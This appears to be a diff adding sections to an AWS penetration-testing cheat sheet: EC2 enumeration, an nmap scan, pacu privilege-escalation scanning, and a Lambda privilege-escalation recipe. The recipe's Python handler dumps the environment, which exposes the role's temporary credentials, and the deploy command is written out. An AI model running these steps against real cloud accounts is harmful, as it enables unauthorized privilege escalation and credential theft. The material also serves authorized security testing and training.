@@ -87,8 +87,39 @@ aws iam get-user-policy --user-name USERNAME --policy-name POLICYNAME
 aws iam get-group-policy --group-name GROUPNAME --policy-name POLICYNAME
 aws iam get-role-policy --role-name ROLENAME --policy-name POLICYNAME
 ```
+
+### EC2 instance enumeration
+- List all EC2 instances for a specific region
+```
+aws ec2 describe-instances --region REGION
+```
+- Scan the external IP address of EC2 instances with `nmap`
+```
+nmap -sS -Pn IP1,IP2,IP3
+```
 ### Enumeration for initial foothold
 - Use cloud_enum to enumerate the organization
 ```
 ./cloud_enum.py -k ORGNAME
+```
+- Use `pacu` for advanced enumeration (an other activities) with credentials. Specifically the `iam__privesc_scan` script.
+
+### Privilege escalation via lambda functions
+- If the compromised account has access to create lambda functions and `iam:PassRole` privileges then a lambda function with high privileges can be created
+- Store the following code in a file and name it `lambda_function.py`
+```
+import json
+import subprocess
+
+def lambda_handler(event, context):
+    data = subprocess.Popen('env', stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+    output, errors = data.communicate()
+    return {
+        'statusCode': 200,
+        'body': json.dumps(output)
+    }
+```
+- Zip the file in an archive and run the following command
+```
+aws lambda create-function --function-name privesc-fun --runtime python3.7 --zip-file fileb://my-function.zip --handler lambda_function.lambda_handler --role ROLEARN --region us-east-2 --profile PROFILE
 ```
